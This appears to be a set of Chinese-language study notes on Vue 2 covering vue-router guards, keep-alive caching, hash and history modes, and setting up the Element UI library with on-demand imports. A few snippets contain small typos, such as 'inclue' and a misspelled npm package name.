#### 路由重复跳转，报`redundant navigation`

解决`redundant navigation`问题，在`router/index.js`中重写`push`和`replace`方法

```js
...
let originPush = VueRouter.prototype.push
VueRouter.prototype.push = function (location, resolve, reject) {
    if (resolve && reject) {
        originPush.call(this, location, resolve, reject)
    } else {
        originPush.call(
            this,
            location,
            () => {
            },
            () => {
            })
    }
}

let originReplace = VueRouter.prototype.replace
VueRouter.prototype.replace = function (location, resolve, reject) {
    if (resolve && reject) {
        originReplace.call(this, location, resolve, reject)
    } else {
        originReplace.call(
            this,
            location,
            () => {
            },
            () => {
            })
    }
}

Vue.use(VueRouter)
...
```

#### 样例：三级菜单跳转携带参数

例一：三级菜单栏的路由跳转，传递不同的参数

```js
      let {categoryname, category1id, category2id, category3id} = event.target.dataset
      if(categoryname) { // 匹配到a标签
        // 整理路由跳转参数
        let location = {name: 'search'}
        let query = {categoryName: categoryname}
        if(category1id) {
          query.category1id = category1id
        } else if(category2id) {
          query.category2id = category2id
        } else {
          query.category3id = category3id
        }
        // 合并参数
        location.query = query
        this.$router.push(location)
      }
```

用在不同地方的统一组件，在路由跳转时，要明确有没有参数合并的需求，

- 因为一个地方可能是`query`参数，另一个地方可能是`params`参数

  `A`组件用到`search`组件，是`params`参数

  ```js
      goSearch() {
        let location = {
          name: "search",
          params: {
            keyword: this.keyword || undefined,
          },
        }
        if(this.$route.query) { 
          location.query = this.$route.query
        }
        this.$router.push(location)
      }
  ```

  `B`组件也用到`search`组件，是`query`参数

  ```js
      goSearch() {
        let {categoryname, category1id, category2id, category3id} = event.target.dataset
        if (categoryname) 
          let location = {name: 'search'}
          let query = {categoryName: categoryname}
          if (category1id) {
            query.category1id = category1id
          } else if (category2id) {
            query.category2id = category2id
          } else {
            query.category3id = category3id
          }
          // 合并参数
          location.query = query
          
          if(this.$route.params) {
            location.params = this.$route.params
          }
          this.$router.push(location)
        }
      },
  ```

  当`A`、`B`两个组件出现在同一页面时，就要考虑先后查询的问题（查询参数是否需要合并）

### 6.5.2.缓存路由组件

如果一个组件中，有输入框，切换后组件会销毁，再重新点回去组件会重新渲染，现在希望保留输入框的值

我们需要加一个配置项`keep-alive`，包裹`router-view`，那么加在哪个组件里呢？看需求

先给`News`组件添加`input`

`News.vue`

```vue
<template>
  <div>
    <h2>News</h2>
    <input type="text">
  </div>
</template>

```

我们希望在切换`News`组件和`Message`组件时，`input`值仍存在，在这两个组件的父组件中使用`keep-alive`

`About.vue`

```vue
    <router-link to="/about/news">news</router-link><br/>
    <router-link to="/about/message">message</router-link>
    <keep-alive>
      <router-view></router-view>
    </keep-alive>
```

此时`News`组件和`Mesage`组件在切换时就都不会被销毁了

如果只想缓存`News`组件，可以使用`include`配置项，值为组件中的`name`配置项

```vue
    <keep-alive inclue="News">
      <router-view></router-view>
    </keep-alive>
```

如果是缓存多个组件，可以使用数组写法

```vue
    <keep-alive :inclue= "['News', 'Message']">
      <router-view></router-view>
    </keep-alive>
```

注意：如果两个路由组件中，用到了一个公共的组件，而这个公共组件又请求了服务器数据，那么这两个路由组件在来回切换时，就会不断重复的发请求，因为路由组件会不断的销毁创建

一般这种情况会把发送请求的放在`App`组件中，不会用`keep-alive`的，这是个误区，你用`keep-alive`至少还是会发两次请求。

### 6.5.3.两个新的生命周期钩子

如果被缓存的组件，需要做销毁定时器的操作，那么不能在`beforeDestroy`生命周期中编写代码

- `activated`
  - 被缓存的组件激活了

- `deactivated`
  - 被缓存的组件失活了

### 6.5.4.全局前置_路由守卫

这是一个权限的问题，每次路由切换的时候，都要做一个校验

怎么做这个校验呢？

`router/index.js`暴露`VueRouter`实例之前，给其加一个前置路由守卫，即调用该实例对象上的`beforeEach`方法

调用时机：

- 初始化的时候被调用
- 每次路由切换之前被调用

```js
const router = new VueRouter({
    routes: [...]
})
    
// 全局前置路由守卫

router.beforeEach(() => {
   console.log('abcd') 
})

export default router
```

如果不加参数，切换路由前，虽然执行了这个钩子，但是路由组件没有被渲染

因为还要传递三个参数，可以打印看下

- `to`：目标路由
- `from`：源路由
- `next`：放行，如果不写，则不会继续往下走了

```js
router.beforeEach((to, from, next) => {
    console.log(to)
    console.log(from)
    console.log(next)
    next()
})
```

从`home`切换到`about`

![image-20220606065720223](image-20220606065720223.png)

我们可以根据`fullPath`、`path`或`name`属性值来判断，是否执行`next`

```js
router.beforeEach((to, from, next) => {
    if(to.path === '/about') {
        alert('该页面无权查看')
    } else {
        next()
    }
})
```

此时从`home`组件跳转到`about`组件之前，就会弹窗提示，并且路由也不会发生变化

![image-20220606070303702](image-20220606070303702.png)

但是如果有多个页面都需要判断，如想要向`News`和`Message`添加权限，上述的`to.path`写法就显得有些繁琐了

可以在`router/index.js`中，在需要校验的组件中，新增配置项`meta`，用于表示是否需要权限校验

```js
children: [
            {
                path: 'news',
                component: News,
                meta: { // 新增meta配置项
                    isAuth: false
                }
            },
            {
                name: 'message',
                path: 'Message',
                component: Message,
                meta: { // 新增meta配置项
                    isAuth: true
                },
                children: [
                    {
                        name: 'xiangqing',
                        path: 'detail/:id/:title',
                        component: Detail,
                        props({params: {id, title}}) {
                            return {id ,title}
                        }
                    }
                ]
            }
        ]
```

我们先关掉之前对`about`组件的鉴权，然后点击`about/news`，可以看到`to`的身上多了`isAuth`属性值

![image-20220606071152032](image-20220606071152032.png)

利用该属性进行判断是否需要鉴权

```js
router.beforeEach((to, from, next) => {
    if(to.meta.isAuth) {
        alert('该页面无权查看')
    } else {
        next()
    }
})
```



此时想从`News`跳转到`Message`组件，就会提示没有权限了

![image-20220606071339607](image-20220606071339607.png)

### 6.5.5.全局后置_路由守卫

我们按照前置路由守卫的写法，先测试看一下

```js
router.afterEach((to, from, next) => {
    console.log(to)
    console.log(from)
    console.log(next) // undefined
})
```

调用时机：

- 初始化的时候被调用
- 每次路由切换之后被调用



后置路由守卫，是没有`next`的，因为路由已经切换完了，还要`next`干嘛，所以只写两个参数即可

那么，没有`next`，还守卫啥呢？

实际开发中，不同栏目切换时，希望浏览器页签标题，和目录名对应上

可以在`meta`中自定义路由元信息`title`，在后置路由守卫中，进行处理

`router/index.js`

```js
...
children: [
            {
                path: 'news',
                component: News,
                meta: {
                    isAuth: false,
                    title: '新闻'
                }
            },
            {
                name: 'message',
                path: 'Message',
                component: Message,
                meta: {
                    isAuth: true,
                    title: '消息'
                },
                children: [
                    {
                        name: 'xiangqing',
                        path: 'detail/:id/:title',
                        component: Detail,
                        props({params: {id, title}}) {
                            return {id, title}
                        }
                    }
                ]
            }
        ]
...
```



```js
router.afterEach((to, from) => {
    document.title = to.meta.title || 'RouterGuard' // 设置页签标题以及默认值
})
```





为啥不能在前置路由守卫中处理

- 对于没有权限的路由，放在前置路由中处理`document.title`的话，直接就修改了，但事实是页面并没有跳转，如下，`message`组件没有权限访问，由于是在前置路由守卫中处理的，页签标题仍会修改

- 除非说每次`next`之前，都要修改一次，就显得很繁琐

  ![image-20220606113037754](image-20220606113037754.png)

- 希望正确跳转之后，才执行的操作，可以放在后置路由守卫中

### 6.5.6.独享路由守卫

需求：指向对单独的一个路由，作限制

在`route`规则中，新增配置项`beforeEnter: (to, from, next) => {}`（前置独享路由守卫），注意没有后置独享路由守卫，可以和后置路由守卫配合使用

然后将之前的路由守卫的规则，放入函数体即可

```js
{
                name: 'message',
                path: 'Message',
                component: Message,
                meta: {
                    isAuth: true,
                    title: '消息'
                },
                beforeEnter: (to, from, next) => { // 配置`Message`组件独享的路由守卫
                    if (to.meta.isAuth) {
                        alert('该页面无权查看')
                    } else {
                        next()
                    }
                },
                children: [
                    {
                        name: 'xiangqing',
                        path: 'detail/:id/:title',
                        component: Detail,
                        props({params: {id, title}}) {
                            return {id, title}
                        }
                    }
                ]
            }
```

### 6.5.7.组件内路由守卫

组件内的路由守卫，没有前置后置的概念

只有进入该组件时，和离开该组件时的概念

组件内新增配置项：

- `beforeRouterEnter(to, from, next) {}`

  - 通过路由规则，进入当前组件时，被调用

  - 可以在其中逻辑控制

    ```js
      beforeRouteEnter(to, from, next) {
        if (to.meta.isAuth) {
          alert('该页面无权查看')
        } else {
          next()
        }
        console.log('进入Message组件之前')
      },
    ```

    

- `beforeRouterLeave(to, from, next){}`

  - 通过路由规则，离开当前组件时，被调用

    ```js
      beforeRouteLeave(to, from, next) {
        console.log('离开Message组件之前')
        next()
      }
    ```

    

- 注意，一定是通过路由规则，加载组件才会被调用，如果是直接引入组件，则不会被调用

- 应用场景：如果组件里面想要单独写独有的进入或离开的逻辑，可以借助组件内路由守卫



### 6.5.8.`history`模式和`hash`模式

路由器的工作模式，通过配置项`mode`来指定

```js
const router = new VueRouter({
    routes,
    mode: 'hash'
})
```



- `hash`模式：

  - 这里的`hash`和数据加密没有任何关系，就是前端自己在玩的一个东西

  - 从`#`号开始到最后，都作为`hash`值的一部分，不会作为`http`请求路径的一部分

  - `vue-cli`默认使用的是`hash`模式

- `history`模式：

  - 没有`#`号

  - 所有的路径，都会作为`http`请求路径的一部分

  - 直接使用`history`模式的问题

    - 项目上线后，一开始点是没有问题，但是只要一刷新，前端路由的路径，就会向后台服务器请求资源了，报404错误

  - 解决方案

    - 需要后端配合

      - `nodejs`后台

        - 使用`connect-history-api-fallback`中间件，专门用于解决`nodejs`后台处理`history`模式出现的404问题

        - 安装：`npm i connet-history-api-fallback`

        - 在静态资源之前使用：

          ```js
          const express = require('express')
          const history = require('connect-history-api-fallback')
          
          const app = express()
          app.use(history()) // 在静态资源之前使用中间件
          app.use(express.static(__dirname + 'static'))
          
          app.get('/person', (req, res) => {
              res.send({
                  name: 'tom',
                  age: 18
              })
          })
          
          app.listen(5005, (error) => {
              if(!err) console.log('服务器启动成功!')
          })
          ```

      - `python`后台

      - `java`后台

      - `golang`后台

    - 或者可以配置`nginx`代理



小结：

- 对于一个`url`来说，什么是`hash`值？
  - `#`号及其后面的内容就是`hash`值
- `hash`值不会包含在`http`请求中，即：`hash`值不会带给服务器
- `hash`模式：
  - 地址中永远带着`#`号，不美观
  - 若以后将地址通过第三方手机`app`分享，若`app`严格校验，则地址会被标记为不合法
  - 兼容性较好
- `history`模式：
  - 地址干净，美观
  - 兼容性和`hash`模式相比，略差
  - 应用部署上线时，需要后端人员支持，解决刷新页面服务端404的问题

# 7.`Vue` `UI`组件库

组件库定位：

- 如果是高度定制化的页面，结构和样式只能一点点手写

- 如果是能用进行，最好页面不要太丑，就可以用`UI`组件库

## 7.1.移动端常用`UI`组件库

- `Vant`
- `Cube UI`
- `Mint UI`
- `NUTUI`

## 7.2.`PC`端常用`UI`组件库

- `Element UI`
- `IView UI`

## 7.3.`ElementUI`的基本使用

### 安装

官网：https://element.eleme.io/#/zh-CN/component/installation

```bash
npm i element-ui -D
```

当前项目是基于`vue-cli5`安装的`vue2`的项目，提示`core-js`版本过低

```
npm WARN deprecated core-js@2.6.12: core-js@<3.4 is no longer maintained and not recommended for usage due to the number of issues. Because of the V8 engine whims, feature detection in old core-js versions could cause a slowdown up to 100x even if nothing is polyfilled. Please, upgrade your dependencies to the actual version of core-js.

```

但实际上`package.json`中的`core-js`版本是`3.8.3`，可能是`element-ui`中用到的版本吧，暂时跳过这一问题

### 引入

#### 全量引入（不推荐）

`main.js`

```js
import Vue from 'vue'
import App from './App.vue'
import router from './router'
import store from './store'

import ElementUI from 'element-ui'; // 引入element组件库
import 'element-ui/lib/theme-chalk/index.css'; // 引入element全部样式

Vue.config.productionTip = false

Vue.use(ElementUI); // 应用element

new Vue({
  router,
  store,
  render: h => h(App)
}).$mount('#app')

```

#### 按需引入

借助 `babel-plugin-component`，我们可以只引入需要的组件，以达到减小项目体积的目的。

`main.js`

```bash
npm install babel-plugin-component -D
```

然后，将 `.babelrc` 修改为：

```js
{
  "presets": [["es2015", { "modules": false }]],
  "plugins": [
    [
      "component",
      {
        "libraryName": "element-ui",
        "styleLibraryName": "theme-chalk"
      }
    ]
  ]
}
```

如果没有`.babelrc`，应该有`babel.config.js`

原来的内容

```js
module.exports = {
  presets: [
    '@vue/cli-plugin-babel/preset'
  ]
}
```

修改如下：

```js
module.exports = {
  presets: [
    '@vue/cli-plugin-babel/preset',
    ["es2015", { "modules": false }]
  ],
  plugins: [ // 这里是js文件，去掉key的引号
    [
      "component",
      {
        "libraryName": "element-ui",
        "styleLibraryName": "theme-chalk"
      }
    ]
  ]
}

```

> 还会报es2015相关的错误，新的配置见《ElementUI 》这里不重复更新了

### 使用

#### 全量引入使用

直接使用

看文档上哪个适合用的，复制然后改吧改吧

```vue
<input type="text">
<el-row>
  <el-button>默认按钮</el-button>
  <el-button type="primary">主要按钮</el-button>
  <el-button type="success">成功按钮</el-button>
  <el-button type="info">信息按钮</el-button>
  <el-button type="warning">警告按钮</el-button>
  <el-button type="danger">危险按钮</el-button>
</el-row>
```

![image-20220606161429566](image-20220606161429566.png)

#### 按需引入使用

接下来，如果你只希望引入部分组件，那么需要在 `main.js` 中写入以下内容：

```js
import Vue from 'vue'
import App from './App.vue'
import router from './router'
import store from './store'
Vue.config.productionTip = false

import { Button, Row } from 'element-ui'; // 注意引入的时候，是没有`el`的，然后第一个字母大写
Vue.component(Button.name, Button);  // 第一个参数，就是自定义的一个名称
Vue.component(Row.name, Row);
// 那么样式怎么把控呢？
// element会根据引入的组件库，自己分析依赖的样式
// Vue.use(Button)

new Vue({
  router,
  store,
  render: h => h(App)
}).$mount('#app')

```

值得注意的是，组件库的配置和脚手架的配置要合并起来的，如果脚手架更新了，但组件库的配置写法没更新，就会有问题

很明显的一个例子就是，`.babelrc`文件都换成了`babel.config.js`

如上写法，会提示如下错误：

![image-20220606155724194](image-20220606155724194.png)

按照提示，安装下对应的包

```bash
npm i babel-preset-es2015 -D
```

虽然安装成功了，但人家`babel-preset-es2015`更新改名了

```bash
[root@VM-4-12-centos test2]# npm i babel-preset-es2015 -D
npm WARN deprecated babel-preset-es2015@6.24.1: 🙌  Thanks for using Babel: we recommend using babel-preset-env now: please read https://babeljs.io/env to update!

```

再重新启动下项目，报如下错误

![image-20220606160147715](image-20220606160147715.png)

由于人家`es2015`改名了，所以配置文件得修改：

```js
module.exports = {
  presets: [
    '@vue/cli-plugin-babel/preset',
    ["@babel/preset-env", { "modules": false }] // 更正一下包名
  ],
  plugins: [
    [
      "component",
      {
        "libraryName": "element-ui",
        "styleLibraryName": "theme-chalk"
      }
    ]
  ]
}

```

造成这些问题的原因在于，`element`没有及时更新

如果不说怎么改，要真想解决这个问题，需要研究下`babel-plugin-component`文档，看看目前针对最新的脚手架，它的配置是怎么样的

按需引入后的资源大小

![image-20220606160818450](image-20220606160818450.png)











 
